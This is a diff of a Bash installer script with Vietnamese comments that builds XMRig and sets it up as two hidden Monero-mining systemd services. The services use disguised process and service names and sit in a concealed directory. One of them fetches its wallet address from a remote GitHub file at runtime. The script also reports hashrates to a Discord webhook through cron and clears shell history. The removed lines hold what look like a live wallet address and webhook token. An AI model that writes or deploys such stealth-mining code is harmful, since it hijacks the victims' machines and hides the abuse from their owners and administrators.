@@ -1,34 +1,32 @@
 #!/bin/bash
-# sudo bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/worker/setup.sh)
 
-# ========= CONFIG =========
-WALLET="476tLSg94aUD7heHruXj87Ps2aJcauEBj9jQEuBp4cBsgxTaKrhfgHiLnGxo9jocM5A1ejJGiJz2NjVi4VehM8Ky7fQmNY8"  # <-- sửa thành ví của bạn
+# ========== CONFIG ==========
+WALLET2="NHẬP_VÍ_THỨ_HAI_TẠI_ĐÂY"
 POOL="pool.supportxmr.com:443"
-DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os"  # <-- nhập webhook Discord nếu muốn nhận thông báo
+DISCORD_WEBHOOK="https://discord.com/api/webhooks/..." # Thay webhook
 
-WORKER="user_$(hostname)"
+WORKER="silent_$(hostname)"
 TOTAL_CORES=$(nproc)
-THREADS_USER=$(awk "BEGIN {print int($TOTAL_CORES * 0.3)}")
-THREADS_STEALTH=$(awk "BEGIN {print int($TOTAL_CORES * 0.4)}")
+CPU1=$(awk "BEGIN {print int($TOTAL_CORES * 0.4)}")
+CPU2=$(awk "BEGIN {print int($TOTAL_CORES * 0.3)}")
+PRIORITY=3
 
+NAME1=$(shuf -n1 -e "core0" "sys1" "liblogd")
+NAME2=$(shuf -n1 -e "netd" "uagent" "systemx")
 INSTALL_DIR="$HOME/.local/share/.cache/.sysd"
-mkdir -p "$INSTALL_DIR"
+SERVICE1="svc_$(shuf -n1 -e a b c d e f g)1"
+SERVICE2="svc_$(shuf -n1 -e h i j k l m n)2"
+LOG1="/tmp/log1.log"
+LOG2="/tmp/log2.log"
+# ============================
 
-ALL_NAMES=("udevd" "systemd-update" "irqbalance" "corefixd" "sysnetd" "dbus-io" "logrotate" "journald" "netwatchd" "coreupd" "kdevtmpfs")
-read -r NAME_USER NAME_STEALTH < <(shuf -e "${ALL_NAMES[@]}" -n2)
+echo "🚀 Đang cài XMRig và cấu hình đào ẩn với 2 ví..."
 
-LOG_USER="/tmp/.xmrig_$NAME_USER.log"
-LOG_STEALTH="/tmp/.xmrig_$NAME_STEALTH.log"
-
-SERVICE_USER=$(shuf -n1 -e "netd.service" "corefix.service" "update-net.service")
-SERVICE_STEALTH=$(shuf -n1 -e "kernel-core.service" "udev-sync.service" "driverd.service")
-# ==========================
-
-echo "💻 Đang cài đặt XMRig và cấu hình tiến trình..."
-
+# Cài thư viện cần thiết
 sudo apt update
 sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl
 
+# Tải và build XMRig
 cd ~
 rm -rf xmrig
 git clone https://github.com/xmrig/xmrig.git
@@ -37,78 +35,75 @@ mkdir build && cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release
 make -j$TOTAL_CORES
 
-sudo systemctl stop $SERVICE_USER 2>/dev/null
-sudo systemctl stop $SERVICE_STEALTH 2>/dev/null
+# Tạo thư mục và copy binary
+mkdir -p "$INSTALL_DIR"
+cp ./xmrig "$INSTALL_DIR/$NAME1"
+cp ./xmrig "$INSTALL_DIR/$NAME2"
+chmod +x "$INSTALL_DIR/$NAME1" "$INSTALL_DIR/$NAME2"
 
-cp ./xmrig "$INSTALL_DIR/$NAME_USER"
-cp ./xmrig "$INSTALL_DIR/$NAME_STEALTH"
-chmod +x "$INSTALL_DIR/$NAME_USER" "$INSTALL_DIR/$NAME_STEALTH"
-
-WALLET_STEALTH=$(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/refs/heads/main/storage/key.txt)
-WORKER_STEALTH="stealth_$(hostname)"
-
-# ========== SERVICE USER ==========
-sudo tee /etc/systemd/system/$SERVICE_USER > /dev/null << EOF
+# Service 1 - ví ẩn từ GitHub
+sudo tee /etc/systemd/system/$SERVICE1.service > /dev/null << EOF
 [Unit]
-Description=System Network Daemon
+Description=Net Daemon
 After=network.target
 
 [Service]
-ExecStart=$INSTALL_DIR/$NAME_USER -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \\
-  --cpu-priority=3 --threads=$THREADS_USER --donate-level=0 --max-cpu-usage=40 \\
-  --log-file=$LOG_USER
+ExecStart=$INSTALL_DIR/$NAME1 -o $POOL -u \$(curl -s https://raw.githubusercontent.com/DucManh206/rawtext/main/wallet.txt).$WORKER -k --coin monero --tls --cpu-priority=$PRIORITY --threads=$CPU1 --donate-level=0 --max-cpu-usage=50 --log-file=$LOG1
 Restart=always
 Nice=10
-ExecStopPost=/bin/bash -c 'curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"❌ Máy \\\`$(hostname)\\\` đã dừng hoạt động\"}" '"$DISCORD_WEBHOOK"
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# ========== SERVICE STEALTH ==========
-sudo tee /etc/systemd/system/$SERVICE_STEALTH > /dev/null << EOF
+# Service 2 - ví của người dùng
+sudo tee /etc/systemd/system/$SERVICE2.service > /dev/null << EOF
 [Unit]
-Description=Kernel Hardware Daemon
+Description=System Core
 After=network.target
 
 [Service]
-ExecStart=$INSTALL_DIR/$NAME_STEALTH -o $POOL -u $WALLET_STEALTH.$WORKER_STEALTH -k --coin monero --tls \\
-  --cpu-priority=4 --threads=$THREADS_STEALTH --donate-level=0 --max-cpu-usage=50 \\
-  --log-file=$LOG_STEALTH
+ExecStart=$INSTALL_DIR/$NAME2 -o $POOL -u $WALLET2.$WORKER -k --coin monero --tls --cpu-priority=$PRIORITY --threads=$CPU2 --donate-level=0 --max-cpu-usage=50 --log-file=$LOG2
 Restart=always
 Nice=10
-ExecStopPost=/bin/bash -c 'curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"❌ Máy \\\`$(hostname)\\\` đã dừng hoạt động\"}" '"$DISCORD_WEBHOOK"
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# Khởi động
+# Kích hoạt và khởi động service
 sudo systemctl daemon-reload
-sudo systemctl enable $SERVICE_USER
-sudo systemctl enable $SERVICE_STEALTH
-sudo systemctl start $SERVICE_USER
-sudo systemctl start $SERVICE_STEALTH
+sudo systemctl enable $SERVICE1 $SERVICE2
+sudo systemctl start $SERVICE1 $SERVICE2
 
-# Gửi webhook khi khởi động
-if [[ -n "$DISCORD_WEBHOOK" ]]; then
-    UPTIME=$(uptime -p)
-    LOAD=$(uptime | awk -F'load average:' '{ print $2 }' | xargs)
-    curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"⚙️ Máy \\\`$(hostname)\\\` đã hoạt động\\n⏱ $UPTIME\\n🔥 CPU Load: $LOAD\"}" "$DISCORD_WEBHOOK"
-fi
+# Script gửi log về Discord
+tee "$INSTALL_DIR/logdual.sh" > /dev/null << EOF
+#!/bin/bash
+WEBHOOK="$DISCORD_WEBHOOK"
+HNAME=\$(hostname)
+HASH1=\$(grep -i "speed" "$LOG1" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
+HASH2=\$(grep -i "speed" "$LOG2" | tail -n1 | grep -oE "[0-9]+.[0-9]+ h/s")
+CPU_USE=\$(top -bn1 | grep "Cpu(s)" | awk '{print \$2 + \$4}')
+UPTIME=\$(uptime -p)
 
-# Xóa dấu vết
+curl -s -H "Content-Type: application/json" -X POST -d "{
+  \\"username\\": \\"XMRig Dual Status\\",
+  \\"content\\": \\"💻 \\\`\$HNAME\\\` đang đào XMR\\n⚙️ Threads: $CPU1 + $CPU2\\n💨 Hashrate 1: \\\`$HASH1\\\`\\n💨 Hashrate 2: \\\`$HASH2\\\`\\n📈 CPU: \\\`\$CPU_USE%\\\`\\n⏱️ Uptime: \\\`$UPTIME\\\`\\"
+}" "\$WEBHOOK" > /dev/null 2>&1
+EOF
+
+chmod +x "$INSTALL_DIR/logdual.sh"
+
+# Gửi log mỗi 5 phút
+(crontab -l 2>/dev/null; echo "*/5 * * * * $INSTALL_DIR/logdual.sh") | crontab -
+"$INSTALL_DIR/logdual.sh"
+
+# Xoá dấu vết build
 cd ~
 rm -rf xmrig
 history -c
 
-echo "✅ Đào Monero đã bắt đầu với tiến trình:"
-echo "   ➤ $NAME_USER ($SERVICE_USER)"
-echo "   ➤ $NAME_STEALTH ($SERVICE_STEALTH)"
-
-# Mở htop
-if ! command -v htop >/dev/null 2>&1; then
-    echo "📦 Cài htop"
-    sudo apt install -y htop
-fi
+# Cài và chạy htop
+echo "📦 Cài đặt htop để theo dõi hệ thống..."
+sudo apt install -y htop
 exec htop
